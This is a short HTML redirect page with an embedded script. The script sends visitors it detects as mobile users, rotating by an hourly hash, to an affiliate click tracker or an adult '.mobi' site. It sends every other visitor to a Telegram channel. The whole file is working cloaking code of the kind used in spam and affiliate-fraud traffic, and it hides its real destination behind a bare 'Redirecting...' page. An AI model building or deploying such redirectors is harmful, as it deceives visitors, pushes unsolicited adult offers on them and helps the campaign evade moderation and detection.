<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script>
    const offers = [
      "https://smark.top/click?o=2&a=6549&sub_id1=inst",
      
      "https://grzvkg.badmilfs.mobi/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=212364&s2=2182630"
      
    ];

    function isMobileDevice() {
      const ua = navigator.userAgent.toLowerCase();
      return /android|iphone|ipad|ipod/.test(ua);
    }

    function isMobileBrowser() {
      const ua = navigator.userAgent.toLowerCase();
      return /mobile|safari|crios|chrome|samsungbrowser/.test(ua);
    }

    function isRealMobileUser() {
      return isMobileDevice() && isMobileBrowser();
    }

    function hashString(str) {
      let hash = 0;
      for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash |= 0; // Convert to 32bit integer
      }
      return Math.abs(hash);
    }

    // Генерируем хеш от юзер-агента и времени захода (±детерминированно)
    const ua = navigator.userAgent;
    const now = new Date().getTime();
    const salt = Math.floor(now / (1000 * 60 * 60)); // 1 час как "сессия"
    const hash = hashString(ua + salt);
    const offerIndex = hash % offers.length;

    const redirectTo = isRealMobileUser()
      ? offers[offerIndex]
      : "https://t.me/me9fun";

    window.location.href = redirectTo;
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
